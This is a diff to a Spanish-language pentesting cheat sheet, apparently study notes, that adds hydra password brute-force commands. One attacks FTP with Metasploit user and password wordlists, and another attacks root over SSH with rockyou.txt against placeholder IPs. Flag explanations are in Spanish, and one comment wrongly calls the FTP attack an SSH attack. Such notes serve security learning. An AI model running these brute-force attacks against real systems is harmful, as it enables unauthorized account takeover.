@@ -35,6 +35,8 @@ Esto se usa en el panel del admin de WordPress.
 ```python
 ❯ hydra -l omar -P /usr/share/wordlists/rockyou.txt ftp://❮IP❯ -t 15 # Haremos un ataque de fuerza bruta al puerto SSH, antes de completar el comando con soble TAB podemos ver la lista de diccionarios
 
+❯ hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt ❮IP❯ ftp
+
 	# l (ele) = Usuario que en este caso es  'omar'
 	# L = Indicas un archivo que disponga de usuarios 
 	# P = Ruta del diccionario o 'archivo que contiene passwds'
@@ -54,6 +56,7 @@ Esto se usa en el panel del admin de WordPress.
 ```
 
 ```python
+❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ❮IP❯ ssh
 ❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://❮IP❯ -t 15 -V -s 2222 # Haremos un ataque de fuerza bruta al puerto SSH, antes de completar el comando con soble TAB podemos ver la lista de diccionarios
 
 	# ssh = Puerto al que vamos a atacar 22
